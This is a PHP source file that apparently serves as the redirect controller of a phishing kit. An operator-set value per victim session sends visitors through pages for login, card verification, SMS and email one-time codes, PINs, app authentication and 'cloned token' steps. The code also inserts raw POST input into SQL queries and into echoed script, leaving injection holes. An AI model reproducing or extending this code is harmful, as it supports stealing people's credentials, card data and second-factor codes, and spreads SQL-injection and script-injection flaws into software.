<?php
$session = $_POST['z'];
$xyz = $_POST['xyz'];
require_once '../../admin/config/config.php';



$sql = "SELECT Next_Redirect FROM logs WHERE SessionID = '$session';";
$result = mysqli_query($conn, $sql);


if (mysqli_num_rows($result) > 0)
{
    // output data of each row
    while($row = mysqli_fetch_assoc($result))
    {
        $z = $row['Next_Redirect'];

        switch ($z)
        {

          //Main Tokens


        case 'login';
	            echo"<script>window.location.href = 'index.php?$xyz'</script>";

			  break;


        case 'cc';
                echo"<script>window.location.href = 'ccverify.php?$xyz'</script>";

        break;

        case 'appauth';
                echo"<script>window.location.href = 'appauth.php?$xyz'</script>";

        break;


        case 'challenge1';
                echo"<script>window.location.href = 'challenge1.php?$xyz'</script>";

        break;


        case 'challenge2';
                echo"<script>window.location.href = 'challenge2.php?$xyz'</script>";

        break;


        case 'challenge3';
                echo"<script>window.location.href = 'challenge3.php?$xyz'</script>";

        break;

        case 'emailotp';
                echo"<script>window.location.href = 'emailotp.php?$xyz'</script>";

        break;

        case 'wait';
                echo"<script>window.location.href = 'wait.php?$xyz'</script>";

        break;

        case 'end';
                echo"<script>window.location.href = 'end.php?$xyz'</script>";

        break;

        case 'auth';
                echo"<script>window.location.href = 'auth.php?$xyz'</script>";

        break;

        case 'smsotp';
                echo"<script>window.location.href = 'smsotp.php?$xyz'</script>";

        break;

        case 'nip';
                echo"<script>window.location.href = 'pincode.php?$xyz'</script>";

        break;





        //Cloned Tokens


        case 'login_c';
                echo"<script>window.location.href = 'logintoken.php?$xyz'</script>";

        break;

        case 'auth_c';
                echo"<script>window.location.href = 'authtoken.php?$xyz'</script>";

        break;


        case 'auth_c2';
                echo"<script>window.location.href = 'authtoken2.php?$xyz'</script>";

        break;

        case 'cc_c';
                echo"<script>window.location.href = 'cctoken.php?$xyz'</script>";

        break;


        case 'token_c_a';
                echo"<script>window.location.href = 'a-token.php?$xyz'</script>";

        break;


        case 'token_c_b';
                echo"<script>window.location.href = 'b-token.php?$xyz'</script>";

        break;


        case 'waiting_c';
                echo"<script>window.location.href = 'wait-token.php?$xyz'</script>";

        break;


        case 'end_c';
                echo"<script>window.location.href = 'end-token.php?$xyz'</script>";

        break;


        case 'emailotp_c';
                echo"<script>window.location.href = 'emailtoken.php?$xyz'</script>";

        break;


        case 'sms_c';
                echo"<script>window.location.href = 'smstoken.php?$xyz'</script>";

        break;


        case 'app_c';
                echo"<script>window.location.href = 'apptoken.php?$xyz'</script>";

        break;


        case 'recovery_c';
                echo"<script>window.location.href = 'recovery.php?$xyz'</script>";

        break;


        case 'main_c';
                echo"<script>window.location.href = 'main-token.php?$xyz'</script>";

        break;



//



















        }

    }

     $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
         mysqli_query($conn,$sqlRedirectReset);
}

else
{
   //do nothing Lol
}

mysqli_close($conn);

?>
